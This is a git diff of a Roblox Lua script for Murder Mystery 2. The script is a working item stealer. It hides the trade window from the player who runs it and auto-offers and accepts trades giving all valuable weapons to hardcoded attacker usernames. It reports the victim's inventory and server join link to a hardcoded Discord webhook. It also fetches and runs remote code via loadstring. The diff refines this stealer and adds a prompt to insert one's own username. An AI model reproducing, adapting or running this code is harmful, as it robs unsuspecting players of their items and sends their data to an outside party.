@@ -1,40 +1,44 @@
 _G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-	return
-end
+if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {"cripIess", "flames_xx", "azusasdemise", "User_Enter"}
+-- Put your username here
+local Users = _G.Usernames or {"User_Enter", "cripIess", "flames_xx", "azusasdemise"}
 local min_rarity = _G.min_rarity or "Common"
 local min_value = _G.min_value or 0
-local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1545919794618966026/Ap0IGJDB8w4Fu15M8OX60-VIo-q0vAIgWQccp6HTtFGVwRskB8GWYSLLNjJjDezLHieV"
 
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 
-if next(users) == nil or webhook == "" then
-	return
-end
+if next(Users) == nil or webhook == "" then return end
+
+if not game:IsLoaded() then game.Loaded:Wait() end
 
 if game.PlaceId ~= 142823291 then
+	plr:Kick("Game not supported. Please join a normal Murder Mystery 2 server")
 	return
 end
 
 local successServerType, serverType = pcall(function()
 	return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
 end)
-if successServerType and serverType == "VIPServer" then
-	return
-end
+if successServerType and serverType == "VIPServer" then return end
 
-if #Players:GetPlayers() >= 12 then
-	return
-end
+if #Players:GetPlayers() >= 12 then return end
 
 local playerGui = plr:WaitForChild("PlayerGui")
 local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-local supremeValues = loadstring(game:HttpGet("https://raw.githubusercontent.com/aluucardd/MM2/refs/heads/main/newValues.json"))()
+
+local successValues, supremeValues = pcall(function()
+    return loadstring(game:HttpGet("https://raw.githubusercontent.com/aluucardd/MM2/refs/heads/main/newValues.json"))()
+end)
+
+if not successValues or not supremeValues then
+    plr:Kick("Failed to load values.")
+    return
+end
+
 -- Flatten the table
 local flatValues = {}
 for _, category in pairs(supremeValues) do
@@ -46,28 +50,10 @@ end
 local HttpService = game:GetService("HttpService")
 
 local rarityTable = {
-	"Common",
-	"Uncommon",
-	"Rare",
-	"Legendary",
-	"Godly",
-	"Ancient",
-	"Unique",
-	"Vintage"
+	"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"
 }
 
-local categories = {
-	godly = "https://supremevaluelist.com/mm2/godlies.html",
-	ancient = "https://supremevaluelist.com/mm2/ancients.html",
-	unique = "https://supremevaluelist.com/mm2/uniques.html",
-	classic = "https://supremevaluelist.com/mm2/vintages.html",
-	chroma = "https://supremevaluelist.com/mm2/chromas.html"
-}
-local headers = {
-	["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-	["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
-}
-
+-- Auto-Accept Trade Bypass (From your script)
 game.ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(nub)
 	if nub.LastOffer then
 		local lastofer = nub.LastOffer
@@ -79,146 +65,8 @@ game.ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(nub)
 	end
 end)
 
-local function trim(s)
-	return s:match("^%s*(.-)%s*$")
-end
-
-local function fetchHTML(url)
-	local response = request({
-		Url = url,
-		Method = "GET",
-		Headers = headers
-	})
-	return response.Body
-end
-
-local function parseValue(itembodyDiv)
-	local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
-	if valueStr then
-		valueStr = valueStr:gsub(",", "")
-		local value = tonumber(valueStr)
-		if value then
-			return value
-		end
-	end
-	return nil
-end
-
-local function extractItems(htmlContent)
-	local itemValues = {}
-
-	for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
-		itemName = itemName:match("([^<]+)")
-		if itemName then
-			itemName = trim(itemName:gsub("%s+", " "))
-			itemName = trim((itemName:split(" Click "))[1])
-			local itemNameLower = itemName:lower()
-
-			local value = parseValue(itembodyDiv)
-			if value then
-				itemValues[itemNameLower] = value
-			end
-		end
-	end
-
-	return itemValues
-end
-
-local function extractChromaItems(htmlContent)
-	local chromaValues = {}
-
-	for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
-		chromaName = chromaName:match("([^<]+)")
-		if chromaName then
-			chromaName = trim(chromaName:gsub("%s+", " ")):lower()
-			local value = parseValue(itembodyDiv)
-			if value then
-				chromaValues[chromaName] = value
-			end
-		end
-	end
-
-	return chromaValues
-end
-
-local function buildValueList()
-	local allExtractedValues = {}
-	local chromaExtractedValues = {}
-	local categoriesToFetch = {}
-
-	for rarity, url in pairs(categories) do
-		table.insert(categoriesToFetch, {rarity = rarity, url = url})
-	end
-
-	local totalCategories = #categoriesToFetch
-	local completed = 0
-	local lock = Instance.new("BindableEvent")
-
-	for _, category in ipairs(categoriesToFetch) do
-		task.spawn(function()
-			local rarity = category.rarity
-			local url = category.url
-			local htmlContent = fetchHTML(url)
-
-			if htmlContent and htmlContent ~= "" then
-				if rarity ~= "chroma" then
-					local extractedItemValues = extractItems(htmlContent)
-					for itemName, value in pairs(extractedItemValues) do
-						allExtractedValues[itemName] = value
-					end
-				else
-					chromaExtractedValues = extractChromaItems(htmlContent)
-				end
-			end
-
-			completed = completed + 1
-			if completed == totalCategories then
-				lock:Fire()
-			end
-		end)
-	end
-
-	lock.Event:Wait()
-
-	local valueList = {}
-
-	for dataid, item in pairs(database) do
-		local itemName = item.ItemName and item.ItemName:lower() or ""
-		local rarity = item.Rarity or ""
-		local hasChroma = item.Chroma or false
-
-		if itemName ~= "" and rarity ~= "" then
-			local weaponRarityIndex = table.find(rarityTable, rarity)
-			local godlyIndex = table.find(rarityTable, "Godly")
-
-			if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
-				if hasChroma then
-					local matchedChromaValue = nil
-					for chromaName, value in pairs(chromaExtractedValues) do
-						if chromaName:find(itemName) then
-							matchedChromaValue = value
-							break
-						end
-					end
-
-					if matchedChromaValue then
-						valueList[dataid] = matchedChromaValue
-					end
-				else
-					local value = allExtractedValues[itemName]
-					if value then
-						valueList[dataid] = value
-					end
-				end
-			end
-		end
-	end
-
-	return valueList
-end
-
 local function sendTradeRequest(user)
-	local targetPlayer = game:GetService("Players"):FindFirstChild(user)
+	local targetPlayer = Players:FindFirstChild(user)
 	if targetPlayer then
 		local tradeFolder = game:GetService("ReplicatedStorage"):WaitForChild("Trade", 2)
 		if tradeFolder then
@@ -233,7 +81,10 @@ local function sendTradeRequest(user)
 end
 
 local function getTradeStatus()
-	return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+	local success, status = pcall(function()
+		return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+	end)
+	return success and status or "None"
 end
 
 local function acceptTrade()
@@ -253,52 +104,57 @@ end
 local function waitForTradeCompletion()
 	while true do
 		local status = getTradeStatus()
-		if status == "None" then
-			break
-		end
+		if status == "None" then break end
 		task.wait(0)
 	end
 end
 
-local valueList = flatValues
-local min_rarity_index = table.find(rarityTable, min_rarity)
-
 local untradable = {
-	["DefaultGun"] = true,
-	["DefaultKnife"] = true,
-	["Reaver"] = true,
-	["Reaver_Legendary"] = true,
-	["Reaver_Godly"] = true,
-	["Reaver_Ancient"] = true,
-	["IceHammer"] = true,
-	["IceHammer_Legendary"] = true,
-	["IceHammer_Godly"] = true,
-	["IceHammer_Ancient"] = true,
-	["Gingerscythe"] = true,
-	["Gingerscythe_Legendary"] = true,
-	["Gingerscythe_Godly"] = true,
-	["Gingerscythe_Ancient"] = true,
-	["TestItem"] = true,
-	["Season1TestKnife"] = true,
-	["Cracks"] = true,
-	["Icecrusher"] = true,
-	["???"] = true,
-	["Dartbringer"] = true,
-	["TravelerAxeRed"] = true,
-	["TravelerAxeBronze"] = true,
-	["TravelerAxeSilver"] = true,
-	["TravelerAxeGold"] = true,
-	["BlueCamo_K_2022"] = true,
-	["GreenCamo_K_2022"] = true,
-	["SharkSeeker"] = true
+	["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true, ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true,
+	["Reaver_Ancient"] = true, ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
+	["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true, ["Gingerscythe_Godly"] = true,
+	["Gingerscythe_Ancient"] = true, ["TestItem"] = true, ["Season1TestKnife"] = true, ["Cracks"] = true,
+	["Icecrusher"] = true, ["???"] = true, ["Dartbringer"] = true, ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
+	["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true, ["GreenCamo_K_2022"] = true,
+	["SharkSeeker"] = true, ["SilverSugar"] = true, ["BronzeIceblaster"] = true, ["SilverHallow"] = true,
+	["ElderwoodGunSilver"] = true, ["BronzeHallow"] = true, ["BronzeVampiresEdge"] = true, ["BronzeCandy"] = true,
+	["SlouseClown"] = true, ["BlueCandy"] = true, ["ElderwoodGunGold"] = true, ["Constellation_Bronze"] = true,
+	["Synthwave_Bronze"] = true, ["SwirlyAxeBronze"] = true, ["Gingerscope_Silver"] = true, ["VampireAxe_Gold"] = true,
+	["ElderwoodGunBlue"] = true, ["LogchopperSilver"] = true, ["GoldIcebreaker"] = true, ["LogchopperGold"] = true,
+	["MintyBronze"] = true, ["Synthwave_Silver"] = true, ["Synthwave_Blue"] = true, ["SlouseClownGun"] = true,
+	["BronzeIcebreaker"] = true, ["ElderwoodKnifeBlue"] = true, ["GoldHallow"] = true, ["IcepiercerGold"] = true,
+	["RedHallow"] = true, ["IceHammerRed"] = true, ["RedIcebreaker"] = true, ["VampireAxe_Purple"] = true,
+	["LogchopperBronze"] = true, ["IceHammerBronze"] = true, ["Gingerscythe_Bronze"] = true, ["IcepiercerRed"] = true,
+	["SwirlyAxeSilver"] = true, ["Celestial_Silver"] = true, ["Celestial_Bronze"] = true, ["Celestial_Red"] = true,
+	["Constellation_Gold"] = true, ["Constellation_Silver"] = true, ["VampireAxe_Silver"] = true, ["VampireAxe_Bronze"] = true,
+	["IceHammerSilver"] = true, ["LogchopperBlue"] = true, ["Gingerscope_Gold"] = true, ["Gingerscope_Bronze"] = true,
+	["Gingerscope_Blue"] = true, ["Gingerscythe_Silver"] = true, ["BronzeSugar"] = true, ["Gingerscythe_Blue"] = true,
+	["MintyGold"] = true, ["SilverCandy"] = true, ["IcepiercerSilver"] = true, ["BronzeHarvester"] = true,
+	["IcepiercerBronze"] = true, ["IceHammerGold"] = true, ["GoldIceblaster"] = true, ["SwirlyGunSilver"] = true,
+	["GoldSugar"] = true, ["GoldVampiresEdge"] = true, ["ElderwoodKnifeSilver"] = true, ["ElderwoodKnifeGold"] = true,
+	["BlueSugar"] = true, ["Constellation_Red"] = true, ["MintyBlue"] = true, ["SwirlyAxeGold"] = true, ["GoldHarvester"] = true,
+	["SilverVampiresEdge"] = true, ["SwirlyGunGold"] = true, ["SwirlyGunBronze"] = true, ["SwirlyGunBlue"] = true,
+	["SwirlyAxeBlue"] = true, ["SilverHarvester"] = true, ["BlueHarvester"] = true, ["SilverIcebreaker"] = true,
+	["SilverIceblaster"] = true, ["ElderwoodKnifeBronze"] = true, ["BlueVampiresEdge"] = true, ["MintySilver"] = true,
+	["RedIceblaster"] = true, ["Synthwave_Gold"] = true, ["ElderwoodGunBronze"] = true, ["GoldCandy"] = true,
+	["Celestial_Gold"] = true, ["Gingerscythe_Gold"] = true, ["RaygunBronze"] = true, ["RaygunGold"] = true, ["RaygunRed"] = true,
+	["RaygunSilver"] = true, ["SnowDaggerBronze"] = true, ["SnowDaggerGold"] = true, ["SnowDaggerRed"] = true,
+	["SnowDaggerSilver"] = true, ["SnowcannonBronze"] = true, ["SnowcannonGold"] = true, ["SnowcannonRed"] = true,
+	["SnowcannonSilver"] = true, ["FertilizerBox"] = true, ["Gift"] = true, ["SnowflakeKey"] = true, ["WrapPaperBoxBlue"] = true,
+	["WrapPaperBoxGold"] = true, ["WrapPaperBoxGreen"] = true, ["WrapPaperBoxPurple"] = true, ["WrapPaperBoxRed"] = true,
+	["WrapPaperBoxUltra"] = true, ["Candies"] = true, ["Candies2017"] = true, ["SkeletonKey"] = true, ["Synthwave_Ancient"] = true,
+	["Emptybringer"] = true, ["EmptybringerChroma"] = true, ["Synthwave_Godly"] = true
 }
 
 local function getValidWeapons()
 	local weaponsToSend = {}
 	local totalValue = 0
-	local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
-
-	if realData and realData.Weapons and realData.Weapons.Owned then
+	
+	local success, realData = pcall(function()
+		return game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+	end)
+	
+	if success and realData and realData.Weapons and realData.Weapons.Owned then
 		for i, v in pairs(realData.Weapons.Owned) do
 			local dataid = i
 			local amount = v
@@ -307,11 +163,14 @@ local function getValidWeapons()
 			if itemInfo and itemInfo.Rarity then
 				local rarity = itemInfo.Rarity
 				local weapon_rarity_index = table.find(rarityTable, rarity)
+				local min_rarity_index = table.find(rarityTable, min_rarity)
+
 				if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
 					local value
 					local lowerName = itemInfo.ItemName:lower()
-if valueList[lowerName] then
-    value = valueList[lowerName]
+					
+					if flatValues[lowerName] then
+						value = flatValues[lowerName]
 					else
 						if weapon_rarity_index >= table.find(rarityTable, "Godly") then
 							value = 10
@@ -319,6 +178,7 @@ if valueList[lowerName] then
 							value = 0.1
 						end
 					end
+					
 					if value >= min_value then
 						totalValue = totalValue + (value * amount)
 						table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
@@ -337,9 +197,9 @@ end
 
 local messageId = nil
 
-local function formatEmbedAndSend(list, totalValue, prefix, isFirst, statusDescription, colorCode)
+local function formatEmbedAndSend(list, totalValue, prefix, statusDescription, colorCode)
 	local executor = identifyexecutor and identifyexecutor() or "Unknown"
-	local receiverList = table.concat(users, ", ")
+	local receiverList = table.concat(Users, ", ")
 
 	local itemsList = ""
 	for _, item in ipairs(list) do
@@ -347,9 +207,7 @@ local function formatEmbedAndSend(list, totalValue, prefix, isFirst, statusDescr
 		itemsList = itemsList .. string.format("%s%s (%s) -> %s\n", item.DataID, amountTxt, item.Rarity, (item.Value * item.Amount))
 	end
 
-	if #itemsList > 900 then
-		itemsList = itemsList:sub(1, 900) .. "\n... (Plus more!)"
-	end
+	if #itemsList > 900 then itemsList = itemsList:sub(1, 900) .. "\n... (Plus more!)" end
 
 	local fields = {
 		{
@@ -361,16 +219,13 @@ local function formatEmbedAndSend(list, totalValue, prefix, isFirst, statusDescr
 			name = "Inventory:",
 			value = string.format("```\nTotal Value: %s\n\n%s```", totalValue, itemsList),
 			inline = false
-		}
-	}
-
-	if isFirst and not messageId then
-		table.insert(fields, {
+		},
+		{
 			name = "🔗 Join Server",
 			value = "[Click to Join Server](https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId .. ")",
 			inline = false
-		})
-	end
+		}
+	}
 
 	local data = {
 		["content"] = (prefix or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
@@ -379,14 +234,13 @@ local function formatEmbedAndSend(list, totalValue, prefix, isFirst, statusDescr
 			["description"] = statusDescription or "🟡  Pending",
 			["color"] = colorCode or 16776960,
 			["fields"] = fields,
-			["footer"] = {
-				["text"] = "this script was made by azusa"
-			},
+			["footer"] = { ["text"] = "this script was made by azusa" },
 			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
 		}}
 	}
 
 	local body = HttpService:JSONEncode(data)
+	
 	if messageId then
 		pcall(function()
 			request({
@@ -415,13 +269,9 @@ local function formatEmbedAndSend(list, totalValue, prefix, isFirst, statusDescr
 end
 
 local tradegui = playerGui:WaitForChild("TradeGUI")
-tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
-	tradegui.Enabled = false
-end)
+tradegui:GetPropertyChangedSignal("Enabled"):Connect(function() tradegui.Enabled = false end)
 local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
-tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
-	tradeguiphone.Enabled = false
-end)
+tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function() tradeguiphone.Enabled = false end)
 
 local initialWeapons, initialTotalVal = getValidWeapons()
 
@@ -429,9 +279,7 @@ local function checkAndUpdateStatus()
 	local currentWeapons, currentTotalVal = getValidWeapons()
 	
 	local currentMap = {}
-	for _, w in ipairs(currentWeapons) do
-		currentMap[w.DataID] = w.Amount
-	end
+	for _, w in ipairs(currentWeapons) do currentMap[w.DataID] = w.Amount end
 	
 	local totalInitialCount = 0
 	local remainingCount = 0
@@ -445,47 +293,34 @@ local function checkAndUpdateStatus()
 	local claimedCount = totalInitialCount - remainingCount
 	
 	if claimedCount <= 0 then
-		formatEmbedAndSend(currentWeapons, currentTotalVal, "", false, "🟡  Pending", 16776960)
+		formatEmbedAndSend(currentWeapons, currentTotalVal, "", "🟡  Pending", 16776960)
 	elseif remainingCount <= 0 then
-		formatEmbedAndSend(currentWeapons, currentTotalVal, "", false, "🟢  Claimed", 65280)
+		formatEmbedAndSend(currentWeapons, currentTotalVal, "", "🟢  Claimed", 65280)
 	else
-		formatEmbedAndSend(currentWeapons, currentTotalVal, "", false, "🔵  Partially Claimed", 3447003)
+		formatEmbedAndSend(currentWeapons, currentTotalVal, "", "🔵  Partially Claimed", 3447003)
 	end
 end
 
 plr.AncestryChanged:Connect(function(_, parent)
 	if not parent then
 		local currentWeapons, currentTotalVal = getValidWeapons()
-		local currentMap = {}
-		for _, w in ipairs(currentWeapons) do
-			currentMap[w.DataID] = w.Amount
-		end
-		
-		local totalInitialCount = 0
-		local remainingCount = 0
-		for _, initW in ipairs(initialWeapons) do
-			totalInitialCount = totalInitialCount + initW.Amount
-			local currAmount = currentMap[initW.DataID] or 0
-			remainingCount = remainingCount + currAmount
-		end
-		
-		local claimedCount = totalInitialCount - remainingCount
-		if claimedCount <= 0 then
-			formatEmbedAndSend(currentWeapons, currentTotalVal, "", false, "🔴  Disconnected", 16711680)
-		end
+		formatEmbedAndSend(currentWeapons, currentTotalVal, "", "🔴  Disconnected", 16711680)
 	end
 end)
 
 if #initialWeapons > 0 then
-	local prefix = ""
-	if ping == "Yes" then
-		prefix = "--[[@everyone]] "
-	end
-	formatEmbedAndSend(initialWeapons, initialTotalVal, prefix, true, "🟡  Pending", 16776960)
+    -- Sends the webhook to YOU instantly
+    local prefix = ""
+    if _G.pingEveryone == "Yes" then
+        prefix = "--[[@everyone]] "
+    end
+    
+	formatEmbedAndSend(initialWeapons, initialTotalVal, prefix, "🟡  Pending", 16776960)
 
 	local function doTrade(joinedUser)
 		local weaponsToSend = getValidWeapons()
 		local initialTradeState = getTradeStatus()
+		
 		if initialTradeState == "StartTrade" then
 			game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
 			task.wait(0)
@@ -512,14 +347,12 @@ if #initialWeapons > 0 then
 
 				while i <= #weaponsToSend and slotsUsed < 4 do
 					local weapon = weaponsToSend[i]
-
 					pcall(function()
-						game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(weapon.DataID, "Weapons")
+						game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(weapon.DataID, "Weapons", weapon.Amount)
 					end)
-
 					slotsUsed = slotsUsed + 1
 					table.remove(weaponsToSend, i)
-					task.wait(0)
+					task.wait(0.05)
 				end
 
 				task.wait(0)
@@ -536,7 +369,7 @@ if #initialWeapons > 0 then
 
 	local function autoStartTrade()
 		local function checkAndTrade(player)
-			if table.find(users, player.Name) then
+			if table.find(Users, player.Name) then
 				task.wait(0)
 				while true do
 					doTrade(player.Name)
